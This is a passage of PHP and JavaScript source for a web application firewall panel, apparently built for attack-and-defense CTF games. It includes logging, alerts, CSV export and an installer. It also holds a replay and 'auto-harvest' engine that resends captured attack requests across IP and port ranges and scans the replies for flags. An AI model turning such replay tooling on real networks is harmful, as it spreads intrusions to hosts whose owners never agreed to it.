style.innerHTML = '@keyframes toastIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } } @keyframes toastOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }';
document.head.appendChild(style);

function playAlertSound(isUrgent) {
  try {
    var ctx = _pwaf_actx || new (window.AudioContext || window.webkitAudioContext)();
    if (ctx.state === 'suspended') { ctx.resume(); }
    var osc = ctx.createOscillator(); var gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.type = isUrgent ? 'sawtooth' : 'square';
    osc.frequency.value = isUrgent ? 880 : 600;
    gain.gain.setValueAtTime(0.05, ctx.currentTime);
    osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.15);
    if (isUrgent) {
      var osc2 = ctx.createOscillator(); var gain2 = ctx.createGain();
      osc2.connect(gain2); gain2.connect(ctx.destination);
      osc2.type = 'sawtooth'; osc2.frequency.value = 880;
      gain2.gain.setValueAtTime(0.05, ctx.currentTime + 0.2);
      osc2.start(ctx.currentTime + 0.2); osc2.stop(ctx.currentTime + 0.35);
    }
  } catch(e) {}
}

function showToast(title, msg, isUrgent) {
  var t = document.createElement('div');
  var bgColor = isUrgent ? '#7f1d1d' : '#0f1629';
  var bdColor = isUrgent ? '#dc2626' : '#1e2d4a';
  var titleColor = isUrgent ? '#fca5a5' : '#f97316';
  t.style.cssText = 'position:fixed;bottom:24px;right:24px;background:' + bgColor + ';border:1px solid ' + bdColor + ';color:#c9d1e0;padding:16px 20px;border-radius:8px;z-index:9999;box-shadow:0 4px 20px rgba(0,0,0,0.5);font-family:Consolas,monospace;animation:toastIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;min-width:280px;';
  t.innerHTML = '<div style="font-weight:bold;font-size:14px;margin-bottom:6px;color:' + titleColor + '">' + title + '</div><div style="font-size:12px;word-break:break-all;line-height:1.6;">' + msg + '</div>';
  document.body.appendChild(t);
  setTimeout(function() {
    t.style.animation = 'toastOut 0.3s ease-in forwards';
    setTimeout(function(){ t.remove(); }, 300);
  }, 4000);
}

function pwafNotify(title, body, tag) {
  if (!_pwaf_notify_perm) return;
  try {
    var n = new Notification(title, { body: body, tag: tag || 'pwaf-' + Date.now(), requireInteraction: false });
    setTimeout(function() { n.close(); }, 8000);
  } catch(e) {}
}

// ── 基础拦截监控 (_poll) ──────────────────────────────────────────────────
setInterval(function() {
  if (document.hidden) return;   // 标签页不可见时不轮询，省流量/电量，避免后台弹窗与告警音
  fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_poll=1', {credentials: 'same-origin'})
    .then(function(r) { return r.json(); })
    .then(function(d) {
      if (!d || !d.total) return;
      if (d.total > _pwaf_last_count) {
        _pwaf_last_count = d.total;
        var cardsO = document.querySelectorAll('.stat-val.orange');
        if (cardsO.length) cardsO[0].textContent = Number(d.total).toLocaleString();
        var cardsR = document.querySelectorAll('.stat-val.red');       // "已封锁" 卡片同步刷新
        if (cardsR.length && d.blocked != null) cardsR[0].textContent = Number(d.blocked).toLocaleString();

        if (d.latest_rule) {
          var urgentRules = ['cmdi','code','upload','flag_leak','flag_leak_b64','flag_leak_hex'];
          var isUrgent = urgentRules.indexOf(d.latest_rule) > -1;
          var title = isUrgent ? '[高危拦截] ' + d.latest_rule.toUpperCase() : '[攻击拦截] ' + d.latest_rule.toUpperCase();
          // 转义攻击者可控的 IP/URI，防止面板自身 XSS
          var detail = '来源: ' + pwafEsc(d.latest_ip||'未知') + '<br>目标: ' + pwafEsc((d.latest_uri||'').substring(0,60));
          playAlertSound(isUrgent); showToast(title, detail, isUrgent); pwafNotify(title, detail.replace(/<br>/g, ' | '), 'pwaf-attack');
        }

        if (d.recent_blocks) {
          var replayTable = document.getElementById('replay-log-table');
          if (replayTable) {
            var esc = function(s) { return String(s||'').replace(/[&<>'"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[c]; }); };
            var html = '<tbody><tr><th>时间</th><th>规则</th><th>方法</th><th>URI</th><th>Payload</th><th>操作</th></tr>';
            d.recent_blocks.forEach(function(ev) {
              var rmethod = ev.method || 'GET'; var ruri = ev.uri || '/'; var rpost = ev.post || '';
              var raw = rmethod + ' ' + ruri + " HTTP/1.1\nHost: {target}\nUser-Agent: " + (ev.ua || 'Mozilla/5.0');
              if (rmethod === 'POST' && rpost) raw += "\nContent-Type: application/x-www-form-urlencoded\n\n" + rpost;
              var b64raw = btoa(unescape(encodeURIComponent(raw))); 
              var ts = new Date((ev.ts || 0) * 1000);
              var timeStr = String(ts.getHours()).padStart(2,'0') + ':' + String(ts.getMinutes()).padStart(2,'0') + ':' + String(ts.getSeconds()).padStart(2,'0');
              var shortPayload = (ev.payload || '').length > 40 ? ev.payload.substring(0, 40) : ev.payload;
              html += '<tr><td style="white-space:nowrap">' + timeStr + '</td><td><span class="b b-' + esc(ev.rule) + '">' + esc(ev.rule) + '</span></td><td>' + esc(rmethod) + '</td><td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + esc(ruri) + '">' + esc(ruri) + '</td><td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#fbbf24" title="' + esc(ev.payload) + '">' + esc(shortPayload) + '</td><td><button type="button" class="btn bs" style="padding:2px 6px;font-size:10px" onclick="pwafLoadReplay(this)" data-raw="' + b64raw + '">加载</button></td></tr>';
            });
            html += '</tbody>'; replayTable.innerHTML = html;
          }
        }
        // 计数与卡片已就地更新，不再整页 reload —— 否则每次攻击都会刷新页面、
        // 清空正在输入的"假 Flag / basedir"等表单，并打断阅读。
      }
    }).catch(function(){});
}, 3000);

// ── 流量重放引擎 (Replay) ──────────────────────────────────────────────────
function ip2long(ip) { var parts = ip.split('.'); if (parts.length !== 4) return 0; return ((parseInt(parts[0])<<24) + (parseInt(parts[1])<<16) + (parseInt(parts[2])<<8) + parseInt(parts[3])) >>> 0; }
function long2ip(l) { return [(l>>>24)&255, (l>>>16)&255, (l>>>8)&255, l&255].join('.'); }

var _replay_running = false; var _replay_stop = false;
function pwafLoadReplay(btn) {
  var b = atob(btn.getAttribute('data-raw'));
  // 解码为编码的逆运算（encode 用 btoa(unescape(encodeURIComponent()))），
  // 保证含中文/非 ASCII 字节的载荷不被破坏；失败则退回原始字节串。
  var raw; try { raw = decodeURIComponent(escape(b)); } catch(e) { raw = b; }
  document.getElementById('replay-raw').value = raw;
  showTab('replay', null);
}
function pwafReplayStop() {
  _replay_stop = true;
  document.getElementById('replay-status').textContent = '已停止';
  document.getElementById('replay-btn').style.display = '';
  document.getElementById('replay-stop-btn').style.display = 'none';
}

async function pwafReplayBroadcast() {
  if (_replay_running) return;
  var raw = document.getElementById('replay-raw').value.trim();
  if (!raw) { alert('请输入 HTTP 请求模板'); return; }
  var ipStart = document.getElementById('replay-ip-start').value.trim();
  var ipEnd = document.getElementById('replay-ip-end').value.trim();
  var pStart = parseInt(document.getElementById('replay-port-start').value) || 80;
  var pEnd = parseInt(document.getElementById('replay-port-end').value) || pStart;
  var skipSelf = document.getElementById('replay-skip-self').checked;
  var flagRegex = document.getElementById('replay-flag-regex').value.trim();
  if (!ipStart || !ipEnd) { alert('请输入 IP 范围'); return; }

  var startL = ip2long(ipStart), endL = ip2long(ipEnd);
  if (startL > endL) { var tmp = startL; startL = endL; endL = tmp; }
  if (pStart > pEnd) { var tmpP = pStart; pStart = pEnd; pEnd = tmpP; }
  var total = (endL - startL + 1) * (pEnd - pStart + 1);

  _replay_running = true; _replay_stop = false;
  document.getElementById('replay-btn').style.display = 'none';
  document.getElementById('replay-stop-btn').style.display = '';
  document.getElementById('replay-flag-list').innerHTML = '';

  var sent = 0, flags = 0, errors = 0;
  var myIp = "<?= $ip ?>";
  var myServerIp = "<?= isset($_SERVER['SERVER_ADDR']) ? $e($_SERVER['SERVER_ADDR']) : '' ?>";
  var seenFlags = {};
  var flagList = document.getElementById('replay-flag-list');

  // 构建目标任务表（跳过自己：浏览器IP + 本机服务端IP，避免打自己队伍的靶机）
  var tasks = [];
  for (var i = startL; i <= endL; i++) {
    var tip = long2ip(i);
    if (skipSelf && (tip === myIp || (myServerIp && tip === myServerIp))) continue;
    for (var p = pStart; p <= pEnd; p++) tasks.push([tip, p]);
  }
  total = tasks.length;

  function addFlag(f, tip, p) {
    if (seenFlags[f]) return; seenFlags[f] = 1; flags++;
    var div = document.createElement('div');
    div.style.cssText = 'padding:4px 8px;border-bottom:1px solid var(--border)';
    div.innerHTML = '<span style="color:var(--green)">' + pwafEsc(f) + '</span> <span style="color:var(--text2);font-size:10px">← ' + pwafEsc(tip) + ':' + p + '</span>';
    flagList.appendChild(div);
  }

  // 并发池：默认 16 路并发，比原来逐个串行快一个数量级，同时不至于打爆本机 worker
  var idx = 0;
  async function worker() {
    while (!_replay_stop) {
      var t = tasks[idx++]; if (!t) break;
      var tip = t[0], p = t[1];
      document.getElementById('replay-status').textContent = '发送中: ' + tip + ':' + p + ' (' + (sent+1) + '/' + total + ')';
      try {
        var resp = await fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_replay=1', {
          method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: 'target_ip=' + encodeURIComponent(tip) + '&target_port=' + p + '&raw_request=' + encodeURIComponent(raw),
          credentials: 'same-origin'
        });
        var result = await resp.json();
        sent++;
        // 优先使用服务端多编码提取的 flags；再兜底用前端正则扫 body
        if (result.flags && result.flags.length) result.flags.forEach(function(f){ addFlag(f, tip, p); });
        else if (result.body) { var mm = result.body.match(flagRe); if (mm) mm.forEach(function(f){ addFlag(f, tip, p); }); }
        if (result.error) errors++;
      } catch(e) { errors++; }
      document.getElementById('replay-sent').textContent = sent;
      document.getElementById('replay-flags').textContent = flags;
      document.getElementById('replay-errors').textContent = errors;
    }
  }
  var flagRe; try { flagRe = new RegExp(flagRegex, 'g'); } catch(e) { flagRe = /(?:flag|ctf)\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}/g; }
  var CONC = 16, pool = [];
  for (var w = 0; w < CONC; w++) pool.push(worker());
  await Promise.all(pool);

  _replay_running = false;
  document.getElementById('replay-status').textContent = (_replay_stop ? '已停止' : '完成') + '! 共发送 ' + sent + ' / ' + total + ' 个目标，收割 ' + flags + ' 个 flag';
  document.getElementById('replay-btn').style.display = ''; document.getElementById('replay-stop-btn').style.display = 'none';
}

// ── 内存数据池引擎 (用于支持分页和筛选) ──────────────────────────────────
var ftDataPool = [];
var ftPage = 1;
var ftPerPage = 15;
var ftExpandedIds = new Set();
var myIpStr = "<?= $ip ?>";
var myServerIp = "<?= isset($_SERVER['SERVER_ADDR']) ? $e($_SERVER['SERVER_ADDR']) : '' ?>";  // 本机(靶机)自身 IP，盲打跳过
var localIpsArr = ['127.0.0.1', '::1', 'WATCHER', 'SYS', '172.24.0.1'];

function renderFullTraffic() {
  var filterType = document.getElementById('ft-filter-type').value;
  var filterSelf = document.getElementById('filter-self-ip').checked;
  var filterAjax = document.getElementById('filter-ajax').checked;
  var tbody = document.getElementById('ft-tbody');
  if (!tbody) return;

  var filtered = ftDataPool.filter(function(ev) {
    if (filterType === 'pass' && ev.action === 'block') return false;
    if (filterType === 'block' && ev.action === 'pass') return false;
    if (filterSelf && (ev.ip === myIpStr || localIpsArr.includes(ev.ip))) return false;
    if (filterAjax && ev.uri && ev.uri.includes('waf_key=')) return false;
    return true;
  });

  var totalPages = Math.ceil(filtered.length / ftPerPage) || 1;
  if (ftPage > totalPages) ftPage = totalPages;
  if (ftPage < 1) ftPage = 1;
  document.getElementById('ft-page-info').textContent = ftPage + ' / ' + totalPages + ' (共' + filtered.length + '条)';

  var start = (ftPage - 1) * ftPerPage;
  var pageData = filtered.slice(start, start + ftPerPage);

  var html = '';
  var esc = function(s) { return String(s||'').replace(/[&<>'"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[c]; }); };

  pageData.forEach(function(ev) {
    var ts = new Date((ev.ts || 0) * 1000);
    var timeStr = String(ts.getHours()).padStart(2,'0') + ':' + String(ts.getMinutes()).padStart(2,'0') + ':' + String(ts.getSeconds()).padStart(2,'0');
    var isBlock = ev.action === 'block';
    var statusBadge = isBlock 
        ? '<span class="b" style="background:#dc2626; color:#fff; border:1px solid #f87171; padding:2px 8px; box-shadow:0 0 8px rgba(220,38,38,0.4);">拦截</span>' 
        : '<span class="b" style="background:#16a34a; color:#fff; border:1px solid #4ade80; padding:2px 8px; box-shadow:0 0 8px rgba(22,163,74,0.4);">放行</span>';
    
    var rawReq = (ev.method || 'GET') + ' ' + (ev.uri || '/') + " HTTP/1.1\n";
    rawReq += "Host: {target}\n";   // 广播时按目标改写；不再直插未转义的 HTTP_HOST(会破坏 <script> 甚至注入)
    if (ev.ua) rawReq += "User-Agent: " + ev.ua + "\n";
    if (ev.referer) rawReq += "Referer: " + ev.referer + "\n";
    if (ev.method === 'POST') rawReq += "Content-Type: application/x-www-form-urlencoded\n";
    if (ev.post) rawReq += "\n" + ev.post;
    
    var detailHtml = '<div style="background:#030712;padding:12px;border-radius:6px;border:1px solid var(--border);font-family:Consolas,monospace;font-size:12px;white-space:pre-wrap;color:#e2e8f0;max-height:350px;overflow-y:auto;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);">' + esc(rawReq) + '</div>';
    if (isBlock) {
      detailHtml += '<div style="margin-top:8px;padding:8px;background:rgba(220,38,38,0.1);border-left:3px solid #dc2626;color:#fca5a5;font-size:11px;"><b>[拦截触发]</b> 规则: <span class="b br">' + esc(ev.rule) + '</span> &nbsp;|&nbsp; <b>[恶意载荷]</b> ' + esc(ev.payload) + '</div>';
    }

    html += '<tr>' +
      '<td style="white-space:nowrap;color:var(--text2);">' + timeStr + '</td>' +
      '<td>' + statusBadge + '</td>' +
      '<td>' + esc(ev.ip) + '</td>' +
      '<td style="color:' + (ev.method==='POST'?'#f97316':'#38bdf8') + '; font-weight:bold;">' + esc(ev.method) + '</td>' +
      '<td style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap; color:' + (isBlock ? '#fca5a5' : 'inherit') + '" title="' + esc(ev.uri) + '">' + esc(ev.uri) + '</td>' +
      '<td style="text-align:center;"><button type="button" class="btn ' + (isBlock ? 'br' : 'bs') + '" style="padding:2px 8px; font-size:10px;" onclick="toggleTrafficDetail(\'' + ev._id + '\')">详情</button></td>' +
    '</tr>';
    
    var displayStyle = ftExpandedIds.has(ev._id) ? 'table-row' : 'none';
    html += '<tr id="req-detail-' + ev._id + '" style="display:' + displayStyle + ';"><td colspan="6" style="padding:10px 16px;background:var(--card);">' + detailHtml + '</td></tr>';
  });
  
  if(pageData.length === 0) {
    html = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--text2);">暂无匹配数据</td></tr>';
  }
  tbody.innerHTML = html;
}

function ftChangePage(delta) {
  ftPage += delta;
  renderFullTraffic();
}

function toggleTrafficDetail(id) {
  var el = document.getElementById('req-detail-' + id);
  if (el) {
    if (el.style.display === 'none') { el.style.display = 'table-row'; ftExpandedIds.add(id); }
    else { el.style.display = 'none'; ftExpandedIds.delete(id); }
  }
}

// ── 盲打收割核心引擎 (读取后端保存的配置) ──────────────────────────────────
var _autoReapEnabled = <?= !empty($cfg['autoreap_enabled']) ? 'true' : 'false' ?>;
var _autoReapQueue = [];
var _autoReapProcessing = false;
var _processedIds = new Set();
var _autoSentCount = 0;
var _autoFlagCount = 0;

function toggleAutoReapUI(checked) {
  _autoReapEnabled = checked;
  var statusText = document.getElementById('auto-reap-status');
  if (_autoReapEnabled) {
    statusText.innerHTML = '<span style="color:var(--red)">运行中 (疯狂收割中...)</span>';
    processAutoReapQueue(); 
  } else {
    statusText.innerHTML = '已关闭';
  }
}

// 轮询拉取全量流量并更新数据池
setInterval(function() {
  var currentTab = localStorage.getItem('pwaf_active_tab');
  if (currentTab !== 'autoreap' && !_autoReapEnabled) return;

  fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_poll_full=1', {credentials: 'same-origin'})
    .then(function(r) { return r.json(); })
    .then(function(data) {
      if (!data || !data.length) return;
      
      var hasNew = false;
      data.forEach(function(ev) {
        if (!ftDataPool.find(function(item) { return item._id === ev._id; })) {
          ftDataPool.push(ev);
          hasNew = true;
          
          // 盲打逻辑：新流量推入队列 (必须强力过滤面板 ajax 以防死循环风暴)
          // 按内容签名 _sig 去重：同一 payload 只盲打一次，规避时间戳不同 / 双日志重复
          var isAjax = ev.uri && (ev.uri.includes('waf_key='));
          var sig = ev._sig || ev._id;
          if (_autoReapEnabled && !_processedIds.has(sig) && !isAjax && ev.ip !== 'WATCHER' && ev.ip !== 'SYS') {
            _processedIds.add(sig);
            if (_processedIds.size > 2000) { var iter = _processedIds.values(); _processedIds.delete(iter.next().value); }
            
            var rawReqQ = (ev.method || 'GET') + ' ' + (ev.uri || '/') + " HTTP/1.1\nHost: {target}\n";
            if (ev.ua) rawReqQ += "User-Agent: " + ev.ua + "\n";
            if (ev.referer) rawReqQ += "Referer: " + ev.referer + "\n";
            if (ev.method === 'POST') rawReqQ += "Content-Type: application/x-www-form-urlencoded\n";
            if (ev.post) rawReqQ += "\n" + ev.post;
            _autoReapQueue.push(rawReqQ);
          }
        }
      });
      
      if (hasNew) {
        // 数据池按时间倒序，保持最大容量 1000 防止内存泄漏
        ftDataPool.sort(function(a, b) { return b.ts - a.ts; });
        if (ftDataPool.length > 1000) ftDataPool = ftDataPool.slice(0, 1000);
        // 如果用户在看第一页才自动重绘，否则不打断用户往后翻页查看历史
        if (ftPage === 1) renderFullTraffic();
      }
      
      var qCountEl = document.getElementById('auto-queue-count');
      if (qCountEl) qCountEl.textContent = _autoReapQueue.length;
      
      if (_autoReapEnabled && !_autoReapProcessing) processAutoReapQueue();
    }).catch(function(){});
}, 2000); 

// 盲打发包引擎
async function processAutoReapQueue() {
  if (_autoReapProcessing || !_autoReapEnabled || _autoReapQueue.length === 0) return;
  _autoReapProcessing = true;
  
  var ipStartInput = document.querySelector('input[name="autoreap_ip_start"]');
  var ipEndInput = document.querySelector('input[name="autoreap_ip_end"]');
  var pStartInput = document.querySelector('input[name="autoreap_port_start"]');
  var pEndInput = document.querySelector('input[name="autoreap_port_end"]');
  
  if (!ipStartInput || !ipEndInput) { _autoReapProcessing = false; return; }
  
  var ipStart = ipStartInput.value.trim();
  var ipEnd = ipEndInput.value.trim();
  var pStart = parseInt(pStartInput.value) || 80;
  var pEnd = parseInt(pEndInput.value) || pStart;
  
  if (!ipStart || !ipEnd) { _autoReapProcessing = false; return; }
  
  var startL = ip2long(ipStart), endL = ip2long(ipEnd);
  if (startL > endL) { var tmp = startL; startL = endL; endL = tmp; }
  if (pStart > pEnd) { var tmpP = pStart; pStart = pEnd; pEnd = tmpP; }
  
  var phpRegexStr = <?= json_encode(!empty($cfg['flagsub_regex']) ? $cfg['flagsub_regex'] : '(?:flag|ctf)\\{[A-Za-z0-9_\\-\\.!@#$%^&*()+=]{1,100}\\}') ?>;
  var flagRe; try { flagRe = new RegExp(phpRegexStr, 'g'); } catch(e) { flagRe = /(?:flag|ctf)\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}/g; }

  // 目标表（一次构建）：跳过自己(浏览器IP + 本机服务端IP)，绝不打自己队伍的靶机
  var targets = [];
  for (var i = startL; i <= endL; i++) {
    var tip = long2ip(i);
    if (tip === myIpStr || (myServerIp && tip === myServerIp)) continue;
    for (var p = pStart; p <= pEnd; p++) targets.push([tip, p]);
  }
  var seen = {};

  while (_autoReapQueue.length > 0 && _autoReapEnabled) {
    var rawRequest = _autoReapQueue.shift();
    var qCountEl = document.getElementById('auto-queue-count'); if (qCountEl) qCountEl.textContent = _autoReapQueue.length;

    // 并发盲打当前包到全部目标（16 路并发，远快于原逐个串行）
    var ti = 0;
    var sprayWorker = async function() {
      while (_autoReapEnabled) {
        var t = targets[ti++]; if (!t) break;
        var tip = t[0], p = t[1];
        try {
          var resp = await fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_replay=1', {
            method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'target_ip=' + encodeURIComponent(tip) + '&target_port=' + p + '&raw_request=' + encodeURIComponent(rawRequest),
            credentials: 'same-origin'
          });
          var result = await resp.json();
          _autoSentCount++;
          var sCountEl = document.getElementById('auto-sent-count'); if (sCountEl) sCountEl.textContent = _autoSentCount;
          var fl = (result.flags && result.flags.length) ? result.flags : (result.body ? (result.body.match(flagRe) || []) : []);
          fl.forEach(function(f) {
            if (seen[f]) return; seen[f] = 1; _autoFlagCount++;
            var fCountEl = document.getElementById('auto-flag-count'); if (fCountEl) fCountEl.textContent = _autoFlagCount;
            showToast('[盲打收割] 获取到 Flag!', pwafEsc(f) + '<br>来源: ' + pwafEsc(tip) + ':' + p, true);
          });
        } catch(e) {}
      }
    };
    var CONC = 16, pool = [];
    for (var w = 0; w < CONC; w++) pool.push(sprayWorker());
    await Promise.all(pool);
  }
  _autoReapProcessing = false;
}
</script>

</body></html>
<?php
}

function pwaf_login_page(callable $e, $key, $err) { ?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PhoenixWAF</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0e1a;color:#c9d1e0;font-family:'Courier New',Consolas,monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(249,115,22,.08) 0%,transparent 60%);pointer-events:none}
.box{background:#0f1629;border:1px solid #1e2d4a;border-radius:12px;padding:40px 36px;width:360px;position:relative;animation:fadein .4s ease}
@keyframes fadein{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
.box::before{content:'';position:absolute;inset:-1px;border-radius:13px;background:linear-gradient(135deg,rgba(249,115,22,.3),transparent 50%,rgba(56,189,248,.15));z-index:-1;animation:border-glow 3s ease-in-out infinite alternate}
@keyframes border-glow{from{opacity:.5}to{opacity:1}}
.logo{text-align:center;margin-bottom:28px}
.logo-icon{font-size:36px;display:block;margin-bottom:8px;filter:drop-shadow(0 0 12px rgba(249,115,22,.6))}
.logo-name{color:#f97316;font-size:22px;font-weight:bold;letter-spacing:4px;text-shadow:0 0 24px rgba(249,115,22,.5)}
.logo-sub{color:#4a5568;font-size:11px;margin-top:4px;letter-spacing:1px}
.field{margin-bottom:16px}
input[type=password]{width:100%;background:#060a14;border:1px solid #1e2d4a;color:#c9d1e0;padding:11px 14px;border-radius:6px;font-family:inherit;font-size:13px;outline:none;transition:border-color .2s,box-shadow .2s}
input[type=password]:focus{border-color:#f97316;box-shadow:0 0 0 3px rgba(249,115,22,.12)}
button[type=submit]{width:100%;background:linear-gradient(135deg,#f97316,#ea580c);color:#000;border:none;padding:11px;border-radius:6px;font-weight:bold;font-size:13px;cursor:pointer;font-family:inherit;letter-spacing:1px;transition:filter .2s,transform .1s;margin-top:4px}
button[type=submit]:hover{filter:brightness(1.1);transform:translateY(-1px)}
button[type=submit]:active{transform:translateY(0)}
.err{color:#f87171;font-size:11px;margin-bottom:12px;padding:8px 10px;background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.2);border-radius:5px}
.hint{text-align:center;color:#6b7a92;font-size:10px;margin-top:18px;letter-spacing:.5px}
</style></head><body>
<div class="box">
  <div class="logo"><span class="logo-icon">&#x1F9E8;</span><div class="logo-name">PHOENIX</div><div class="logo-sub">WAF v<?= PWAF_VER ?> &mdash; 管理面板</div></div>
  <?php if ($err): ?><div class="err">&#x26A0; <?= $e($err) ?></div><?php endif; ?>
  <form method="post">
    <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
    <div class="field"><input type="password" name="pw" placeholder="管理员密码" autofocus></div>
    <button type="submit">&#x25B6; 登录</button>
  </form>
  <div class="hint">未授权访问将被记录并封禁。</div>
</div>
</body></html>
<?php
}

function pwaf_stats(array $cfg) {
    $lp = (isset($cfg['log']) ? $cfg['log'] : '');
    $s  = ['total'=>0,'blocked'=>0,'by_rule'=>[],'by_ip'=>[],'recent'=>[],'int_alerts'=>0];
    if (!file_exists($lp)) return $s;

        // 避免攻击者通过大量触发日志导致面板 OOM
    $max_lines = 10000;
    $fsize = @filesize($lp);
    if ($fsize === false) return $s;

        $seek_bytes = min($fsize, $max_lines * 350);
    $fp = @fopen($lp, 'r');
    if (!$fp) return $s;

    if ($fsize > $seek_bytes) {
        fseek($fp, $fsize - $seek_bytes);
        fgets($fp);     }

    $tail_lines = [];
    $line_count = 0;
    while (($line = fgets($fp, 4096)) !== false) {
        $line = rtrim($line, "\r\n");
        if ($line === '') continue;
        $tail_lines[] = $line;
        $line_count++;
                if ($line_count > $max_lines + 100) {
            $tail_lines = array_slice($tail_lines, -$max_lines);
            $line_count = count($tail_lines);
        }
    }
    fclose($fp);

        if (count($tail_lines) > $max_lines) {
        $tail_lines = array_slice($tail_lines, -$max_lines);
    }

    foreach ($tail_lines as $line) {
        $ev = json_decode($line, true);
        if (!is_array($ev)) continue;
        $s['total']++;
        if (((isset($ev['action']) ? $ev['action'] : '')) === 'block') $s['blocked']++;
        $r = (isset($ev['rule']) ? $ev['rule'] : 'unknown'); $i = (isset($ev['ip']) ? $ev['ip'] : 'unknown');
        $s['by_rule'][$r] = ((isset($s['by_rule'][$r]) ? $s['by_rule'][$r] : 0)) + 1;
        if ($i !== 'SYS') $s['by_ip'][$i] = ((isset($s['by_ip'][$i]) ? $s['by_ip'][$i] : 0)) + 1;
        if (strpos($r, 'integrity_') === 0) $s['int_alerts']++;
    }
    arsort($s['by_rule']); arsort($s['by_ip']);
    $s['by_ip']   = array_slice($s['by_ip'],   0, 10, true);
    $s['by_rule'] = array_slice($s['by_rule'], 0, 10, true);
        foreach (array_reverse(array_slice($tail_lines, -100)) as $line) {
        $ev = json_decode($line, true);
        if (is_array($ev)) $s['recent'][] = $ev;
    }
    return $s;
}

function pwaf_export_csv(array $cfg) {
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="pwaf_' . date('Ymd_His') . '.csv"');
    $out = fopen('php://output', 'w');
    // CSV 公式注入防护：日志里的 payload/ua/uri 是攻击者可控的，若以 = + - @ 开头，
    // Excel/WPS 会当作公式执行。给这类字段前置一个单引号，使其保持为纯文本。
    $sanitize = function($v) {
        $v = (string)$v;
        if ($v !== '' && strpos("=+-@\t\r", $v[0]) !== false) return "'" . $v;
        return $v;
    };
    $row = function($fields) use ($out, $sanitize) { fputcsv($out, array_map($sanitize, $fields)); };
    $row(['ts','datetime','ip','method','uri','rule','payload','param','ua','action']);
    $lp = (isset($cfg['log']) ? $cfg['log'] : '');
    if (file_exists($lp)) {
        foreach ((array)@file($lp, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) as $line) {
            $ev = json_decode($line, true);
            if (is_array($ev)) $row([(isset($ev['ts']) ? $ev['ts'] : ''),date('Y-m-d H:i:s',(isset($ev['ts']) ? $ev['ts'] : 0)),
                (isset($ev['ip']) ? $ev['ip'] : ''),(isset($ev['method']) ? $ev['method'] : ''),(isset($ev['uri']) ? $ev['uri'] : ''),(isset($ev['rule']) ? $ev['rule'] : ''),(isset($ev['payload']) ? $ev['payload'] : ''),
                (isset($ev['param']) ? $ev['param'] : ''),(isset($ev['ua']) ? $ev['ua'] : ''),(isset($ev['action']) ? $ev['action'] : '')]);
        }
    }
    fclose($out);
}

function pwaf_update_baseline(array $cfg) {
    $db = (isset($cfg['integrity_db']) ? $cfg['integrity_db'] : (pwaf_datadir($cfg) . '/.pwaf_int'));
    $wr = (isset($cfg['webroot']) ? $cfg['webroot'] : '');
    if (!$wr || !is_dir($wr)) return;
    $h = [];
    foreach (pwaf_all_files($wr) as $f) $h[$f] = hash_file('sha256', $f);
    file_put_contents($db, json_encode(['b'=>$h,'ts'=>time()]), LOCK_EX);
}

// SECTION 7: CLI INSTALLER

function pwaf_cli(array $argv) {
    $cmd = (isset($argv[1]) ? $argv[1] : '');
    if (!$cmd || $cmd === '--help') {
        echo "PhoenixWAF v" . PWAF_VER . "\n";
        echo "  --install   <webroot> [--password P] [--key K]\n";
        echo "  --uninstall <webroot>\n";
        echo "  --status    <webroot>\n";
        echo "  --baseline  <webroot>\n";
        echo "  --immortal  <webroot>   (deploy inotifywait kernel file watcher)\n";
        echo "  --ldpreload <webroot>   (deploy precompiled waf.so for LD_PRELOAD protection)\n";
        return;
    }
    $wr = (isset($argv[2]) ? $argv[2] : getcwd());
    if ($cmd === '--install')       pwaf_install($argv);
    elseif ($cmd === '--uninstall') pwaf_uninstall($wr);
    elseif ($cmd === '--status')    pwaf_status($wr);
    elseif ($cmd === '--baseline')  pwaf_baseline_cli($wr);
    elseif ($cmd === '--immortal')  pwaf_deploy_watcher($wr);
    elseif ($cmd === '--ldpreload') pwaf_deploy_ldpreload($wr);
    else echo "[!] Unknown: $cmd\n";
}

function pwaf_install(array $argv) {
    $wr = null; $pw = null; $key = null;
    for ($i = 2; $i < count($argv); $i++) {
        if ($argv[$i] === '--password' && isset($argv[$i+1])) { $pw  = $argv[++$i]; }
        elseif ($argv[$i] === '--key' && isset($argv[$i+1]))  { $key = $argv[++$i]; }
        elseif ($wr === null && $argv[$i][0] !== '-')         { $wr  = $argv[$i]; }
    }
    if (!$wr) { echo "[!] webroot required\n"; exit(1); }
    // 统一为正斜杠路径：PHP 在 Windows 上同样接受正斜杠，且可避免注入的
        $wr = str_replace('\\', '/', rtrim(realpath($wr) ?: $wr, '/\\'));
